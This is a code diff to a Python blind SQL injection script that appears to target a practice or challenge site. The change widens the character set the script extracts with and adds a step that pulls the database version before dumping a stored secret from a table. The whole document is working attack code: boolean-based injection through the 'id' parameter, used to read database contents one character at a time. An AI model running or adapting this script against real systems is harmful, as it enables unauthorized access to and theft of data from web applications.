@@ -3,7 +3,7 @@ import string
 import time
 
 TARGET = "https://elecos432.org/sqlinject3/"
-CHARS = string.ascii_lowercase + string.digits + "_"
+CHARS = string.ascii_lowercase + string.digits + "._-"
 
 def query_true(payload):
     url = TARGET + f"?id=1' AND {payload} AND '1'='1"
@@ -31,6 +31,9 @@ def extract_string(sql_expr, max_length=50):
             break
     return result
 
+print("Extracting full version...")
+version = extract_string("SELECT version()")
+print(f"Version: {version}")
 
 print("Extracting secret...")
 secret = extract_string("SELECT message FROM foo LIMIT 0,1")
